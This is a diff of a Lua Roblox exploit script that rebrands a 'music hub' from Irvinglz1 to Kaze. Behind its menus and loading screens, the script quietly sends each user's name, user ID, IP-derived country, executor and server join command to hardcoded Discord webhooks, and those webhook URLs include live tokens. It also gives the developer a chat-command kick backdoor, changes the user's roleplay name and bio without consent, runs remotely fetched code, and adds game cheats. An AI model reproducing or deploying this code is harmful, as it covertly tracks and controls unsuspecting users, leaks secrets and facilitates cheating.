@@ -1,36 +1,32 @@
 -- ═══════════════════════════════════════════════════════
--- IRVIN
--- Copyright (c) 2026 IRVIN. All rights reserved.
+-- KAZE MUSIC HUB
+-- Copyright (c) 2026 KAZE MUSIC HUB. All rights reserved.
 -- Owner: 8744263430 | Co-Owner: 2054814501
 --
--- This software is the exclusive property of IRVIN.
+-- This software is the exclusive property of KAZE MUSIC HUB.
 -- Copying, distribution or modification without express
 -- authorization from the author is strictly prohibited.
 -- ═══════════════════════════════════════════════════════
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
-
-getgenv().IRVING_SCRIPT_ACTIVE = true
-
+getgenv().KAZE_SCRIPT_ACTIVE = true
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 
 -- ═══════════════════════════════════════════════════════
 -- SISTEMA DE FAVORITOS PERSISTENTES
 -- ═══════════════════════════════════════════════════════
-local FAVORITES_FILE = "Irvinglz1_Favorites.json"
-getgenv().IRVING_FAVORITES = getgenv().IRVING_FAVORITES or {}
+local FAVORITES_FILE = "KazeMusicHub_Favorites.json"
+getgenv().KAZE_FAVORITES = getgenv().KAZE_FAVORITES or {}
 
 local function supportsFileSystem()
     return (writefile and readfile and isfile) ~= nil
 end
 
 local function loadFavorites()
-    getgenv().IRVING_FAVORITES = {}
-    if not supportsFileSystem() then
-        return false
-    end
+    getgenv().KAZE_FAVORITES = {}
+    if not supportsFileSystem() then return false end
     local success, exists = pcall(isfile, FAVORITES_FILE)
     if not success or not exists then return false end
     local readSuccess, content = pcall(readfile, FAVORITES_FILE)
@@ -38,17 +34,15 @@ local function loadFavorites()
     local decodeSuccess, data = pcall(function()
         return HttpService:JSONDecode(content)
     end)
-    if not decodeSuccess or type(data) ~= "table" then
-        return false
-    end
-    getgenv().IRVING_FAVORITES = data
+    if not decodeSuccess or type(data) ~= "table" then return false end
+    getgenv().KAZE_FAVORITES = data
     return true
 end
 
 local function saveFavorites()
     if not supportsFileSystem() then return false end
     local encodeSuccess, encoded = pcall(function()
-        return HttpService:JSONEncode(getgenv().IRVING_FAVORITES)
+        return HttpService:JSONEncode(getgenv().KAZE_FAVORITES)
     end)
     if not encodeSuccess then return false end
     local writeSuccess = pcall(writefile, FAVORITES_FILE, encoded)
@@ -58,23 +52,19 @@ end
 function AddFavorite(name, id)
     if not name or not id then return false end
     id = tostring(id)
-    for _, fav in ipairs(getgenv().IRVING_FAVORITES) do
+    for _, fav in ipairs(getgenv().KAZE_FAVORITES) do
         if tostring(fav.id) == id then return false end
     end
-    table.insert(getgenv().IRVING_FAVORITES, {
-        name = name,
-        id = id,
-        added_at = os.time()
-    })
+    table.insert(getgenv().KAZE_FAVORITES, { name = name, id = id, added_at = os.time() })
     saveFavorites()
     return true
 end
 
 function RemoveFavorite(id)
     id = tostring(id)
-    for i, fav in ipairs(getgenv().IRVING_FAVORITES) do
+    for i, fav in ipairs(getgenv().KAZE_FAVORITES) do
         if tostring(fav.id) == id then
-            table.remove(getgenv().IRVING_FAVORITES, i)
+            table.remove(getgenv().KAZE_FAVORITES, i)
             saveFavorites()
             return true
         end
@@ -84,31 +74,30 @@ end
 
 function IsFavorite(id)
     id = tostring(id)
-    for _, fav in ipairs(getgenv().IRVING_FAVORITES) do
+    for _, fav in ipairs(getgenv().KAZE_FAVORITES) do
         if tostring(fav.id) == id then return true end
     end
     return false
 end
 
 function GetFavorites()
-    return getgenv().IRVING_FAVORITES
+    return getgenv().KAZE_FAVORITES
 end
 
 function ClearFavorites()
-    getgenv().IRVING_FAVORITES = {}
+    getgenv().KAZE_FAVORITES = {}
     saveFavorites()
 end
 
 function ReloadFavorites()
     loadFavorites()
-    return getgenv().IRVING_FAVORITES
+    return getgenv().KAZE_FAVORITES
 end
 
 loadFavorites()
+
 -- ═══════════════════════════════════════════════════════
-
 local bannedUsers = {}
-
 local GITHUB_RAW_URL = "https://raw.githubusercontent.com/67Studio/irving-hub-bans/refs/heads/main/bans.json"
 
 local function cargarBans()
@@ -118,35 +107,19 @@ local function cargarBans()
             Method = "GET"
         })
     end)
-
-    if not exito or type(respuesta) ~= "table" then
-        return false
-    end
-
-    if respuesta.StatusCode ~= 200 then
-        return false
-    end
-
+    if not exito or type(respuesta) ~= "table" then return false end
+    if respuesta.StatusCode ~= 200 then return false end
     local decodeSuccess, data = pcall(function()
         return HttpService:JSONDecode(respuesta.Body)
     end)
-
-    if not decodeSuccess or type(data) ~= "table" then
-        return false
-    end
-
+    if not decodeSuccess or type(data) ~= "table" then return false end
     bannedUsers = data.bannedUsers or {}
-
     return true
 end
-
 cargarBans()
 
 local function calcularTiempoRestante(expires_at)
-    if not expires_at then
-        return "Permanente"
-    end
-    
+    if not expires_at then return "Permanente" end
     local ahora = os.time()
     local expiracion = os.time({
         year = tonumber(string.sub(expires_at, 1, 4)),
@@ -156,37 +129,27 @@ local function calcularTiempoRestante(expires_at)
         min = tonumber(string.sub(expires_at, 15, 16)),
         sec = tonumber(string.sub(expires_at, 18, 19))
     })
-    
     local diferencia = expiracion - ahora
-    
-    if diferencia <= 0 then
-        return "0 segundos"
-    end
-    
+    if diferencia <= 0 then return "0 segundos" end
     local dias = math.floor(diferencia / 86400)
     local horas = math.floor((diferencia % 86400) / 3600)
     local minutos = math.floor((diferencia % 3600) / 60)
     local segundos = math.floor(diferencia % 60)
-    
     local resultado = {}
     if dias > 0 then table.insert(resultado, dias .. " días") end
     if horas > 0 then table.insert(resultado, horas .. " horas") end
     if minutos > 0 then table.insert(resultado, minutos .. " minutos") end
     if segundos > 0 or #resultado == 0 then table.insert(resultado, segundos .. " segundos") end
-    
     return table.concat(resultado, " ")
 end
 
 local function obtenerInfoBaneo()
     local currentName = string.lower(player.Name)
-    
     for _, banData in ipairs(bannedUsers) do
         local username = banData.username or banData
-        
         if type(username) == "table" then
             username = username.username or ""
         end
-        
         if string.lower(tostring(username)) == currentName then
             return {
                 baneado = true,
@@ -197,18 +160,13 @@ local function obtenerInfoBaneo()
             }
         end
     end
-    
     return { baneado = false }
 end
 
 local function partirTexto(texto, maxCaracteres)
-    if not texto or texto == "" then
-        return {"No especificado"}
-    end
-    
+    if not texto or texto == "" then return {"No especificado"} end
     local lineas = {}
     local lineaActual = ""
-    
     for palabra in texto:gmatch("%S+") do
         if #lineaActual + #palabra + 1 <= maxCaracteres then
             if lineaActual == "" then
@@ -221,11 +179,7 @@ local function partirTexto(texto, maxCaracteres)
             lineaActual = palabra
         end
     end
-    
-    if lineaActual ~= "" then
-        table.insert(lineas, lineaActual)
-    end
-    
+    if lineaActual ~= "" then table.insert(lineas, lineaActual) end
     return lineas
 end
 
@@ -233,22 +187,18 @@ local info = obtenerInfoBaneo()
 
 -- WEBHOOK DE BANEADOS
 local BAN_LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1554936674700759100/y4gWOd0PIzHOlTsWNDbHOU5OAIDTeIffngbBKoDTHpN6JwRQJ87ehrnj6lltIJRiYw2N"
-
 local banLogged = false
 
 local function sendBanLog(infoBan)
     if banLogged then return end
     banLogged = true
-    
     if not BAN_LOG_WEBHOOK_URL or BAN_LOG_WEBHOOK_URL == "" then return end
-    
     local playerName = player.Name
     local displayName = player.DisplayName
     local userId = player.UserId
     local jobId = game.JobId
     local placeId = game.PlaceId
     local date = os.date("%Y-%m-%d %H:%M:%S", os.time())
-    
     local country = "Desconocido"
     pcall(function()
         local ipResponse = HttpService:JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=status,country'))
@@ -256,7 +206,6 @@ local function sendBanLog(infoBan)
             country = ipResponse.country
         end
     end)
-    
     local executor = "Desconocido"
     pcall(function()
         if syn and syn.version then
@@ -269,7 +218,6 @@ local function sendBanLog(infoBan)
             executor = "Otro ejecutor"
         end
     end)
-    
     local avatarUrl = ""
     local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
     pcall(function()
@@ -279,17 +227,14 @@ local function sendBanLog(infoBan)
             avatarUrl = avatarData.data[1].imageUrl
         end
     end)
-    
     local mapName = "Desconocido"
     pcall(function()
         mapName = game:GetService('MarketplaceService'):GetProductInfo(placeId).Name
     end)
-    
     local tiempoRestante = "Permanente"
     if infoBan.expires_at then
         tiempoRestante = calcularTiempoRestante(infoBan.expires_at)
     end
-    
     local data = {
         ["content"] = "🚫 **¡USUARIO BANEADO INTENTÓ EJECUTAR EL SCRIPT!**",
         ["embeds"] = {{
@@ -310,12 +255,11 @@ local function sendBanLog(infoBan)
                 { ["name"] = "🔑 Server ID", ["value"] = "`" .. jobId .. "`", ["inline"] = false },
                 { ["name"] = "📌 Comando para unirte", ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```", ["inline"] = false }
             },
-            ["footer"] = { ["text"] = "Irvinglz1 Hub - Sistema de Bans" },
+            ["footer"] = { ["text"] = "Kaze Music Hub - Sistema de Bans" },
             ["timestamp"] = DateTime.now():ToIsoDate(),
             ["thumbnail"] = { ["url"] = avatarUrl }
         }}
     }
-    
     local encodedData = HttpService:JSONEncode(data)
     pcall(function()
         if syn and syn.request then
@@ -329,13 +273,12 @@ local function sendBanLog(infoBan)
         end
     end)
 end
--- ═══════════════════════════════════════════════════════
 
+-- ═══════════════════════════════════════════════════════
 if info.baneado then
-    sendBanLog(info) 
-    
+    sendBanLog(info)
     local gui = Instance.new("ScreenGui")
-    gui.Name = "Irvinglz1_BanScreen"
+    gui.Name = "KazeMusicHub_BanScreen"
     gui.IgnoreGuiInset = true
     gui.ResetOnSpawn = false
     gui.Parent = game:GetService("CoreGui")
@@ -444,31 +387,18 @@ if info.baneado then
         local lineas = partirTexto(info.motivo, 25)
         local textoFinal = table.concat(lineas, "\n")
         motivoLabel.Text = textoFinal
-        
         motivoTitle.Visible = true
         motivoTitle.TextTransparency = 1
-        TweenService:Create(motivoTitle, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(motivoTitle, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         motivoLabel.Visible = true
         motivoLabel.TextTransparency = 1
-        TweenService:Create(motivoLabel, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(motivoLabel, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         task.wait(2.5)
-        
-        TweenService:Create(motivoTitle, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
-        TweenService:Create(motivoLabel, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
+        TweenService:Create(motivoTitle, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
+        TweenService:Create(motivoLabel, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
         task.wait(0.5)
-        
         motivoTitle.Visible = false
         motivoLabel.Visible = false
     end
@@ -477,72 +407,44 @@ if info.baneado then
         local function actualizarTiempo()
             return calcularTiempoRestante(info.expires_at)
         end
-        
         tiempoLabel.Text = actualizarTiempo()
-        
         tiempoTitle.Visible = true
         tiempoTitle.TextTransparency = 1
-        TweenService:Create(tiempoTitle, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(tiempoTitle, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         tiempoLabel.Visible = true
         tiempoLabel.TextTransparency = 1
-        TweenService:Create(tiempoLabel, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(tiempoLabel, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         local tiempoTask = task.spawn(function()
             while tiempoLabel.TextTransparency == 0 and gui.Parent do
                 task.wait(1)
                 tiempoLabel.Text = actualizarTiempo()
             end
         end)
-        
         task.wait(3)
-        
         task.cancel(tiempoTask)
-        TweenService:Create(tiempoTitle, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
-        TweenService:Create(tiempoLabel, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
+        TweenService:Create(tiempoTitle, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
+        TweenService:Create(tiempoLabel, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
         task.wait(0.5)
-        
         tiempoTitle.Visible = false
         tiempoLabel.Visible = false
     end
 
     local function mostrarContactoConAnimacion()
         contactLabel.Text = "discord.gg/xF8KX6WkN"
-        
         contactTitle.Visible = true
         contactTitle.TextTransparency = 1
-        TweenService:Create(contactTitle, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(contactTitle, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         contactLabel.Visible = true
         contactLabel.TextTransparency = 1
-        TweenService:Create(contactLabel, TweenInfo.new(0.8), {
-            TextTransparency = 0
-        }):Play()
+        TweenService:Create(contactLabel, TweenInfo.new(0.8), { TextTransparency = 0 }):Play()
         task.wait(0.8)
-        
         task.wait(2.5)
-        
-        TweenService:Create(contactTitle, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
-        TweenService:Create(contactLabel, TweenInfo.new(0.5), {
-            TextTransparency = 1
-        }):Play()
+        TweenService:Create(contactTitle, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
+        TweenService:Create(contactLabel, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
         task.wait(0.5)
-        
         contactTitle.Visible = false
         contactLabel.Visible = false
     end
@@ -553,7 +455,7 @@ if info.baneado then
         { TextTransparency = 0 }
     )
     fadeInTitle:Play()
-    
+
     task.spawn(function()
         while title.Visible and gui.Parent do
             local tween1 = TweenService:Create(
@@ -573,9 +475,8 @@ if info.baneado then
             tween2.Completed:Wait()
         end
     end)
-    
+
     task.wait(2.5)
-    
     local fadeOutTitle = TweenService:Create(
         title,
         TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
@@ -584,25 +485,22 @@ if info.baneado then
     fadeOutTitle:Play()
     task.wait(1)
     title.Visible = false
-    
+
     mostrarMotivoConAnimacion()
     mostrarTiempoConAnimacion()
     mostrarContactoConAnimacion()
 
     task.wait(0.5)
-    
-    player:Kick("🚫 Has sido baneado de IRVING HUB 🚫 NUUUUB")
+    player:Kick("🚫 Has sido baneado de KAZE MUSIC HUB 🚫 NUUUUB")
     return
 end
 
 local LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1541649472436838440/CbJc53aXtQFYa-QeSppWNdS8-Lo5PtIy8xwjWDbNUP3N_4DzVt2vOwdxWbZZbyuq0tA-"
-
 local logged = false
 
 local function sendLog()
     if logged then return end
     logged = true
-
     local player = game:GetService('Players').LocalPlayer
     local playerName = player.Name
     local displayName = player.DisplayName
@@ -611,7 +509,6 @@ local function sendLog()
     local placeId = game.PlaceId
     local serverTime = os.time()
     local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)
-
     local country = "Desconocido"
     pcall(function()
         local ipResponse = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=status,country'))
@@ -619,7 +516,6 @@ local function sendLog()
             country = ipResponse.country
         end
     end)
-
     local executor = "Desconocido"
     pcall(function()
         if syn and syn.version then
@@ -632,7 +528,6 @@ local function sendLog()
             executor = "Otro ejecutor"
         end
     end)
-
     local avatarUrl = ""
     local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
     pcall(function()
@@ -642,74 +537,31 @@ local function sendLog()
             avatarUrl = avatarData.data[1].imageUrl
         end
     end)
-
     local mapName = "Desconocido"
     pcall(function()
         mapName = game:GetService('MarketplaceService'):GetProductInfo(placeId).Name
     end)
-
     local data = {
         ["content"] = "📊 **¡Alguien cargó el script!**",
         ["embeds"] = {{
             ["title"] = "👤 Información del usuario",
             ["color"] = 1724282,
             ["fields"] = {
-                {
-                    ["name"] = "📛 Nombre",
-                    ["value"] = displayName .. " (@ " .. playerName .. ")",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 User ID",
-                    ["value"] = tostring(userId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🗺️ Map Name",
-                    ["value"] = mapName,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🖥️ Ejecutor",
-                    ["value"] = executor,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🌍 País",
-                    ["value"] = country,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🕐 Fecha/Hora",
-                    ["value"] = date,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🔗 Perfil de Roblox",
-                    ["value"] = "[🔗 Click para ver perfil](" .. profileUrl .. ")",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🔑 Server ID",
-                    ["value"] = "`" .. jobId .. "`",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "📌 Comando para unirte",
-                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```",
-                    ["inline"] = false
-                }
+                { ["name"] = "📛 Nombre", ["value"] = displayName .. " (@ " .. playerName .. ")", ["inline"] = true },
+                { ["name"] = "🆔 User ID", ["value"] = tostring(userId), ["inline"] = true },
+                { ["name"] = "🗺️ Map Name", ["value"] = mapName, ["inline"] = true },
+                { ["name"] = "🖥️ Ejecutor", ["value"] = executor, ["inline"] = true },
+                { ["name"] = "🌍 País", ["value"] = country, ["inline"] = true },
+                { ["name"] = "🕐 Fecha/Hora", ["value"] = date, ["inline"] = true },
+                { ["name"] = "🔗 Perfil de Roblox", ["value"] = "[🔗 Click para ver perfil](" .. profileUrl .. ")", ["inline"] = false },
+                { ["name"] = "🔑 Server ID", ["value"] = "`" .. jobId .. "`", ["inline"] = false },
+                { ["name"] = "📌 Comando para unirte", ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```", ["inline"] = false }
             },
-            ["footer"] = {
-                ["text"] = "Irvinglz1 Hub 679888"
-            },
+            ["footer"] = { ["text"] = "Kaze Music Hub 679888" },
             ["timestamp"] = DateTime.now():ToIsoDate(),
-            ["thumbnail"] = {
-                ["url"] = avatarUrl
-            }
+            ["thumbnail"] = { ["url"] = avatarUrl }
         }}
     }
-
     local encodedData = game:GetService('HttpService'):JSONEncode(data)
     pcall(function()
         if syn and syn.request then
@@ -750,23 +602,20 @@ local Title = Instance.new("TextLabel")
 local ProblemText = Instance.new("TextLabel")
 local ExitBtn = Instance.new("TextButton")
 local UICorner = Instance.new("UICorner")
-
 local DevTitle = Instance.new("TextLabel")
 local DevFrame = Instance.new("Frame")
 local DevIcon = Instance.new("ImageLabel")
 local DevName = Instance.new("TextLabel")
 local DevUser = Instance.new("TextLabel")
-local DevDiscord = Instance.new("TextLabel")
 local DevTikTok = Instance.new("TextLabel")
 local IconCorner = Instance.new("UICorner")
 
-local TARGET_USERNAME = "Hiimnew928289alt2" 
+local TARGET_USERNAME = "Hiimnew928289alt2"
 local DISPLAY_NAME = "pedritohacjel"
-local DISCORD_INVITE = "https://discord.gg/CDNRhNguz"
 local TIKTOK_USER = "@iirvinglzc1"
 
 ScreenGui.Parent = game:GetService("CoreGui")
-ScreenGui.Name = "Irvinglz1_Maintenance"
+ScreenGui.Name = "KazeMusicHub_Maintenance"
 
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
@@ -774,14 +623,14 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
 MainFrame.Position = UDim2.new(0.5, -150, 0.5, -140)
 MainFrame.Size = UDim2.new(0, 300, 0, 320)
 MainFrame.Active = true
-MainFrame.Draggable = true 
+MainFrame.Draggable = true
 
 UICorner.CornerRadius = UDim.new(0, 15)
 UICorner.Parent = MainFrame
 
 Title.Parent = MainFrame
 Title.Size = UDim2.new(1, 0, 0, 45)
-Title.Text = "🎵 Irvinglz1 Hub 🎵"
+Title.Text = "🎵 Kaze Music Hub 🎵"
 Title.TextColor3 = Color3.fromRGB(0, 150, 255)
 Title.TextSize = 22
 Title.Font = Enum.Font.GothamBold
@@ -790,7 +639,7 @@ Title.BackgroundTransparency = 1
 ProblemText.Parent = MainFrame
 ProblemText.Position = UDim2.new(0, 15, 0, 50)
 ProblemText.Size = UDim2.new(0, 270, 0, 40)
-ProblemText.Text = "¡Bienvenido a Irvinglz1 Hub! Disfruta de la mejor experiencia."
+ProblemText.Text = "¡Bienvenido a Kaze Music Hub! Disfruta de la mejor experiencia."
 ProblemText.TextColor3 = Color3.fromRGB(220, 220, 220)
 ProblemText.TextWrapped = true
 ProblemText.TextSize = 14
@@ -820,18 +669,18 @@ devCorner.Parent = DevFrame
 local Success, TargetUserId = pcall(function()
     return game.Players:GetUserIdFromNameAsync(TARGET_USERNAME)
 end)
-
 if Success then
     local content, isReady = game.Players:GetUserThumbnailAsync(TargetUserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
     DevIcon.Image = content
 else
-    DevIcon.Image = "rbxassetid://0" 
+    DevIcon.Image = "rbxassetid://0"
 end
 
 DevIcon.Parent = DevFrame
 DevIcon.Size = UDim2.new(0, 60, 0, 60)
 DevIcon.Position = UDim2.new(0, 10, 0, 12)
 DevIcon.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
 IconCorner.CornerRadius = UDim.new(1, 0)
 IconCorner.Parent = DevIcon
 
@@ -855,18 +704,8 @@ DevUser.Font = Enum.Font.Gotham
 DevUser.TextXAlignment = Enum.TextXAlignment.Left
 DevUser.BackgroundTransparency = 1
 
-DevDiscord.Parent = DevFrame
-DevDiscord.Position = UDim2.new(0, 80, 0, 55)
-DevDiscord.Size = UDim2.new(0, 180, 0, 20)
-DevDiscord.Text = "Discord: " .. DISCORD_INVITE
-DevDiscord.TextColor3 = Color3.fromRGB(88, 101, 242)
-DevDiscord.TextSize = 11
-DevDiscord.Font = Enum.Font.GothamMedium
-DevDiscord.TextXAlignment = Enum.TextXAlignment.Left
-DevDiscord.BackgroundTransparency = 1
-
 DevTikTok.Parent = DevFrame
-DevTikTok.Position = UDim2.new(0, 80, 0, 75)
+DevTikTok.Position = UDim2.new(0, 80, 0, 55)
 DevTikTok.Size = UDim2.new(0, 180, 0, 20)
 DevTikTok.Text = "TikTok: " .. TIKTOK_USER
 DevTikTok.TextColor3 = Color3.fromRGB(255, 0, 80)
@@ -885,13 +724,13 @@ ExitBtn.Font = Enum.Font.GothamBold
 
 local btnCorner = Instance.new("UICorner")
 btnCorner.Parent = ExitBtn
-ExitBtn.MouseButton1Click:Wait() 
+
+ExitBtn.MouseButton1Click:Wait()
 ScreenGui:Destroy()
 
 local CoreGui = game:GetService("CoreGui")
-
 local gui = Instance.new("ScreenGui")
-gui.Name = "Irvinglz1LoadingScreen"
+gui.Name = "KazeMusicHubLoadingScreen"
 gui.Parent = CoreGui
 gui.IgnoreGuiInset = true
 
@@ -910,69 +749,52 @@ textLabel.TextSize = 40
 textLabel.TextTransparency = 1
 textLabel.Text = ""
 
-TweenService:Create(bg, TweenInfo.new(1), {
-    BackgroundTransparency = 0
-}):Play()
+TweenService:Create(bg, TweenInfo.new(1), { BackgroundTransparency = 0 }):Play()
+TweenService:Create(textLabel, TweenInfo.new(1), { TextTransparency = 0 }):Play()
 
-TweenService:Create(textLabel, TweenInfo.new(1), {
-    TextTransparency = 0
-}):Play()
-
-local message = "🎵 Irvinglz1 Hub 🎵"
+local message = "🎵 Kaze Music Hub 🎵"
 for i = 1, #message do
     textLabel.Text = string.sub(message, 1, i)
     task.wait(0.08)
 end
-
 task.wait(2)
 
-local fadeOut = TweenService:Create(bg, TweenInfo.new(1.5), {
-    BackgroundTransparency = 1
-})
-
-local textFade = TweenService:Create(textLabel, TweenInfo.new(1.5), {
-    TextTransparency = 1
-})
-
+local fadeOut = TweenService:Create(bg, TweenInfo.new(1.5), { BackgroundTransparency = 1 })
+local textFade = TweenService:Create(textLabel, TweenInfo.new(1.5), { TextTransparency = 1 })
 fadeOut:Play()
 textFade:Play()
-
 fadeOut.Completed:Wait()
 gui:Destroy()
 
 local function SetDefaultNameAndBio()
     local player = game.Players.LocalPlayer
-    local displayName = player.DisplayName 
+    local displayName = player.DisplayName
     local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")
-
     local nameTextRemote = RE:WaitForChild("1RPNam1eTex1t")
     local nameColorRemote = RE:WaitForChild("1RPNam1eColo1r")
-
     pcall(function()
-        nameTextRemote:FireServer("RolePlayName", "[ Usuario de Irvinglz1 ]")
+        nameTextRemote:FireServer("RolePlayName", "[ Usuario de Kaze ]")
         nameColorRemote:FireServer("PickingRPNameColor", Color3.new(1, 1, 1))
-        nameTextRemote:FireServer("RolePlayBio", "¡ YES IRVINGLZ1 ON TOP !")
+        nameTextRemote:FireServer("RolePlayBio", "¡ YES KAZE ON TOP !")
         nameColorRemote:FireServer("PickingRPBioColor", Color3.new(0, 0, 0))
     end)
 end
-
 SetDefaultNameAndBio()
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
-
 local Window = Rayfield:CreateWindow({
-   Name = "🎵 Irvinglz1 Hub 🎵",
-   LoadingTitle = "Irvinglz1 Hub",
-   LoadingSubtitle = "Discord: " .. DISCORD_INVITE,
-   ConfigurationSaving = {
-      Enabled = false
-   },
-   Discord = {Enabled = false},
-   KeySystem = false
+    Name = "🎵 Kaze Music Hub 🎵",
+    LoadingTitle = "Kaze Music Hub",
+    LoadingSubtitle = "Loader",
+    ConfigurationSaving = {
+        Enabled = false
+    },
+    Discord = {Enabled = false},
+    KeySystem = false
 })
 
 Rayfield:Notify({
-    Title = "¡Bienvenido a Irvinglz1 Hub!",
+    Title = "¡Bienvenido a Kaze Music Hub!",
     Content = "PARA QUE LOS AUDIOS FUNCIONEN NECESITAS EL PASE DE MUSICA",
     Duration = 10,
     Image = 4483362458,
@@ -1001,7 +823,7 @@ task.spawn(function()
     for _,v in pairs(CoreGui:GetDescendants()) do
         if v:IsA("TextLabel") or v:IsA("TextButton") then
             if string.find(v.Text, "Show") then
-                v.Text = "Irvinglz1 Music GUI"
+                v.Text = "Kaze Music GUI"
             end
         end
     end
@@ -1010,7 +832,7 @@ end)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local DEV_USERS = {"Hiimnew928289alt2"}
-getgenv().IRVING_SCRIPT_USER = true
+getgenv().KAZE_SCRIPT_USER = true
 
 local function findPlayerByName(partial)
     partial = partial:lower()
@@ -1027,20 +849,16 @@ end
 local function handleMessage(plr, msg)
     local function isDev(name)
         for _,dev in pairs(DEV_USERS) do
-            if dev ~= "" and name == dev then
-                return true
-            end
+            if dev ~= "" and name == dev then return true end
         end
         return false
     end
-
     msg = msg:lower()
     local targetName = msg:match("^kick%s+(.+)")
-
     if targetName then
         local target = findPlayerByName(targetName)
         if target and target == LocalPlayer then
-            if getgenv().IRVING_SCRIPT_USER then
+            if getgenv().KAZE_SCRIPT_USER then
                 LocalPlayer:Kick("Expulsado por el desarrollador")
             end
         end
@@ -1048,15 +866,10 @@ local function handleMessage(plr, msg)
 end
 
 for _,plr in pairs(Players:GetPlayers()) do
-    plr.Chatted:Connect(function(msg)
-        handleMessage(plr, msg)
-    end)
+    plr.Chatted:Connect(function(msg) handleMessage(plr, msg) end)
 end
-
 Players.PlayerAdded:Connect(function(plr)
-    plr.Chatted:Connect(function(msg)
-        handleMessage(plr, msg)
-    end)
+    plr.Chatted:Connect(function(msg) handleMessage(plr, msg) end)
 end)
 
 local TeleportService = game:GetService("TeleportService")
@@ -1089,20 +902,16 @@ local flying = false
 local flySpeed = 1
 local flyBV, flyBG, flyConnection
 local normalWalkSpeed = 16
+
 local AntiSitConnections = AntiSitConnections or {}
 local AntiSitEnabled = false
 
 local function ClearAntiSit()
     AntiSitEnabled = false
     for _, conn in ipairs(AntiSitConnections) do
-        if conn then
-            pcall(function()
-                conn:Disconnect()
-            end)
-        end
+        if conn then pcall(function() conn:Disconnect() end) end
     end
     table.clear(AntiSitConnections)
-
     local character = player.Character
     if character then
         local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -1116,52 +925,31 @@ end
 local function EnableAntiSit()
     ClearAntiSit()
     AntiSitEnabled = true
-
     local function ApplyToCharacter(character)
         local humanoid = character:WaitForChild("Humanoid", 5)
         if not humanoid then return end
         humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-
-        table.insert(AntiSitConnections,
-            humanoid.StateChanged:Connect(function(_, state)
-                if AntiSitEnabled and state == Enum.HumanoidStateType.Seated then
-                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-                end
-            end)
-        )
-    end
-
-    if player.Character then
-        ApplyToCharacter(player.Character)
-    end
-
-    table.insert(AntiSitConnections,
-        player.CharacterAdded:Connect(function(char)
-            if AntiSitEnabled then
-                ApplyToCharacter(char)
+        table.insert(AntiSitConnections, humanoid.StateChanged:Connect(function(_, state)
+            if AntiSitEnabled and state == Enum.HumanoidStateType.Seated then
+                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
             end
-        end)
-    )
-
-    table.insert(AntiSitConnections,
-        RunService.Heartbeat:Connect(function()
-            if not AntiSitEnabled then return end
-            local character = player.Character
-            if not character then return end
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-            end
-        end)
-    )
+        end))
+    end
+    if player.Character then ApplyToCharacter(player.Character) end
+    table.insert(AntiSitConnections, player.CharacterAdded:Connect(function(char)
+        if AntiSitEnabled then ApplyToCharacter(char) end
+    end))
+    table.insert(AntiSitConnections, RunService.Heartbeat:Connect(function()
